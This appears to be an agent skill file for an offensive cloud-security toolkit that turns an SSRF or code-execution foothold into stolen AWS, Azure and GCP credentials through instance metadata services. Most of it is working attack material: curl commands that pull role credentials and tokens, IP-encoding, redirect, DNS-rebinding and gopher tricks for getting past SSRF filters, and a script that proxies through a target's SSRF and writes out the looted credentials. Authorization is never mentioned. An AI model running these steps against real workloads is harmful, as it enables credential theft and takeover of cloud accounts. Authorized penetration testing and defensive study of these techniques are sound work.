---
name: metadata-ssrf-pivot
description: Turn an SSRF, RCE, file-read-via-URL, or open-proxy foothold on a cloud workload into cloud credentials via the metadata service (AWS IMDSv1/v2, ECS/Fargate/EKS, Azure IMDS, GCP metadata) and then use those credentials off-box for account access. Use whenever a target app fetches attacker-controlled URLs or you have any code execution on a cloud-hosted workload.
license: Apache-2.0
metadata:
  author: Section9Labs
  domain: cloud
---

# Metadata SSRF Pivot — Foothold to Cloud Credentials

Every cloud workload can reach its provider's metadata service on a link-local
address. If you can make the workload issue HTTP requests (SSRF, URL-fetch
feature, PDF renderer, webhook tester, open proxy) or run commands on it (RCE,
container escape), you can steal the credentials attached to its instance role /
managed identity / service account — then use them from YOUR machine.

Part of the `cloud-security` pack. Downstream: `cloud-credential-enumeration`
(enumerate + escalate with the stolen creds), `trufflehog` (scan user-data /
startup scripts / dumped stores), `finding-report` (record the SSRF→cred chain).
Full endpoint catalog + SSRF shaping tricks: **references/endpoints.md**.

## 1. Fingerprint the provider

From the foothold, probe (via SSRF parameter or curl on-box):

```bash
curl -s --max-time 3 http://169.254.169.254/latest/meta-data/            # AWS v1 -> dir listing
curl -s --max-time 3 -X PUT http://169.254.169.254/latest/api/token \
     -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600'                    # AWS v2 -> token
curl -s --max-time 3 -H 'Metadata:true' \
     'http://169.254.169.254/metadata/instance?api-version=2021-02-01'   # Azure -> JSON
curl -s --max-time 3 -H 'Metadata-Flavor: Google' \
     http://metadata.google.internal/computeMetadata/v1/                 # GCP -> dir listing
env | grep -iE 'AWS_CONTAINER|AWS_EXECUTION|ECS|KUBERNETES|AZURE|GOOGLE|FUNCTION'  # container/serverless tells
```

Also fingerprint by response: AWS v1 returns plaintext paths with no header;
Azure 400s without `Metadata:true`; GCP 403s without `Metadata-Flavor: Google`.

## 2. AWS

**IMDSv1** — plain GET, no headers → ANY header-less SSRF works:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/        -> RoleName
http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
  -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}
http://169.254.169.254/latest/user-data                                  -> bootstrap script (often more secrets)
http://169.254.169.254/latest/dynamic/instance-identity/document         -> accountId, region, instanceId
```

**IMDSv2** — session-oriented: a PUT with a TTL header mints a token, every read
needs that token header. Blocks header-less SSRF; needs full request control
(RCE, gopher://, request smuggling, or an SSRF that passes method+headers):

```bash
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
        -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
     http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Note: IMDSv2 default hop limit is 1 — from inside a container with bridged
networking the PUT may fail even on-box; IMDSv1 fallback often still enabled.

**ECS / Fargate** — creds come from a different link-local endpoint, keyed by an
env var (so you need env read or RCE, or guess the UUID path):

```bash
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
# or: curl -s "$AWS_CONTAINER_CREDENTIALS_FULL_URI" -H "Authorization: $(cat $AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE)"
curl -s "$ECS_CONTAINER_METADATA_URI_V4/task"     # task metadata, container list
```

**EKS / IRSA** — pods get a projected web-identity token file:

```bash
cat $AWS_WEB_IDENTITY_TOKEN_FILE   # JWT
aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN \
    --role-session-name x --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE
```

**Use off-box:**
```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
aws sts get-caller-identity     # arn:aws:sts::123456789012:assumed-role/<Role>/<instance-id>
```
STS creds work from anywhere unless VPC-endpoint/SourceIp conditions block them —
if calls fail off-box with `aws:SourceIp`-style denies, run the CLI through the
foothold instead.

## 3. Azure

IMDS requires `Metadata:true` and rejects redirects — GET only, so any SSRF that
can set one header works; header-less SSRF does not:

```bash
curl -s -H 'Metadata:true' \
  'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
# -> {"access_token":"eyJ...","expires_on":"...","resource":"...","token_type":"Bearer"}
curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'
```

Swap `resource=` to pivot: `https://graph.microsoft.com/` (AAD/Entra),
`https://vault.azure.net` (Key Vault data plane), `https://storage.azure.com/`.
Multiple identities: add `&client_id=<id>` or `&object_id=<id>`. App
Service/Functions use `$IDENTITY_ENDPOINT` + `X-IDENTITY-HEADER: $IDENTITY_HEADER`
instead (see references/endpoints.md).

**Use off-box:**
```bash
TOKEN=eyJ...
az rest --method get --url 'https://management.azure.com/subscriptions?api-version=2020-01-01' \
        --headers "Authorization=Bearer $TOKEN" --skip-authorization-header
# or raw: curl -H "Authorization: Bearer $TOKEN" 'https://management.azure.com/subscriptions?api-version=2020-01-01'
# decode the JWT payload for tenant (tid), identity (oid/xms_mirid)
```

## 4. GCP

Requires `Metadata-Flavor: Google` (legacy `X-Google-Metadata-Request: True`).
`metadata.google.internal` resolves to 169.254.169.254:

```bash
H='Metadata-Flavor: Google'; B=http://metadata.google.internal/computeMetadata/v1
curl -s -H "$H" "$B/instance/service-accounts/default/token"      # {"access_token":"ya29....","expires_in":...}
curl -s -H "$H" "$B/instance/service-accounts/default/scopes"     # cloud-platform = full power
curl -s -H "$H" "$B/instance/service-accounts/default/email"
curl -s -H "$H" "$B/?recursive=true&alt=json"                     # EVERYTHING in one blob
curl -s -H "$H" "$B/instance/attributes/startup-script"           # bootstrap secrets
curl -s -H "$H" "$B/project/attributes/ssh-keys"
```

The legacy **v1beta1** endpoint needed NO header — gone on modern GCE, but check
old GKE/legacy instances: `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`.

**Use off-box:**
```bash
export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29....
gcloud projects list; gcloud compute instances list --project example-project-123
# raw: curl -H "Authorization: Bearer ya29...." https://cloudresourcemanager.googleapis.com/v1/projects
# token scope check: curl 'https://www.googleapis.com/oauth2/v3/tokeninfo?access_token=ya29....'
```
Tokens are scope-limited, not identity-limited — a `cloud-platform` scope token is
the full service account.

## 5. SSRF shaping when you can't set headers

Full matrix in references/endpoints.md. Summary:

- **Header-less SSRF is enough for**: AWS IMDSv1, ECS 169.254.170.2 (if you know
  the URI), GCP v1beta1 legacy, Alibaba/other v1-style clones.
- **Blocked by header requirements**: IMDSv2 (PUT+header), Azure (header), GCP v1
  (header) — unless the SSRF primitive forwards attacker headers/method (proxy
  misconfigs, `curl`-wrapping endpoints, SSRF in code that copies request headers).
- **Filter bypasses for the IP**: `http://169.254.169.254` as decimal
  `http://2852039166/`, hex `http://0xA9FEA9FE/`, octal `http://0251.0376.0251.0376/`,
  mixed `http://169.254.43518/`; IPv6 `http://[::ffff:a9fe:a9fe]/` or
  `http://[fd00:ec2::254]/` (AWS IMDS IPv6); DNS names that resolve there
  (`metadata.google.internal`, or your own A record → 169.254.169.254).
- **Redirects**: if the fetcher follows 3xx, host `Location:
  http://169.254.169.254/latest/meta-data/...` on your server — bypasses
  hostname allowlists (Azure IMDS itself rejects redirect-sourced requests; the
  trick targets the app's filter, not the IMDS).
- **DNS rebinding**: TTL-0 record alternating 203.0.113.10 ↔ 169.254.169.254
  defeats resolve-then-check validators.
- **gopher:// / request smuggling**: raw TCP control lets you send the IMDSv2 PUT
  or arbitrary headers through an SSRF that supports gopher (some curl/libcurl
  sinks) — craft the full HTTP request byte-by-byte.

## 6. Script-driven pivot + handoff

```bash
# direct (on-box or port-forwarded)
python3 scripts/metadata_pivot.py --provider aws -o out/
python3 scripts/metadata_pivot.py --provider azure --resource https://vault.azure.net -o out/
python3 scripts/metadata_pivot.py --provider gcp -o out/

# through an SSRF proxy: {url} is replaced with the (URL-encoded) metadata URL
python3 scripts/metadata_pivot.py --provider aws \
  --ssrf 'https://app.example.com/fetch?u={url}' -o out/
python3 scripts/metadata_pivot.py --provider ecs \
  --cred-uri /v2/credentials/0123abcd-... -o out/

# reparse saved raw responses only
python3 scripts/parse_metadata_creds.py out/metadata-raw.json -o out/work-units.json --assets out/assets.json
```

The script mints the IMDSv2 token when PUT is possible (falls back to v1), sets
required headers, walks role → credentials, grabs user-data / identity doc /
startup-script, and writes:

- `out/metadata-raw.json` — every raw response (evidence + trufflehog fodder),
- `out/credentials.json` — parsed creds/tokens with export-ready env lines,
- `out/work-units.json` — **bare JSON array** of work units (one per credential:
  `targets=[role-arn or identity]`, `hints={provider, cred_ref, expiry,
  next_skill: cloud-credential-enumeration}`),
- `out/assets.json` — asset list (cloud-account, principal, compute-instance,
  secret) for `assets.mark`.

**Hand off**: feed every credential to `cloud-credential-enumeration`; scan
`out/metadata-raw.json` + any user-data/startup-script loot with `trufflehog
filesystem`; record the SSRF→cloud-credential chain via `finding-report`
(entry URL, exact metadata request, identity obtained, proof =
`sts get-caller-identity` / tokeninfo output). rupu wiring: **references/rupu.md**.
This step's output file: **out/work-units.json**.
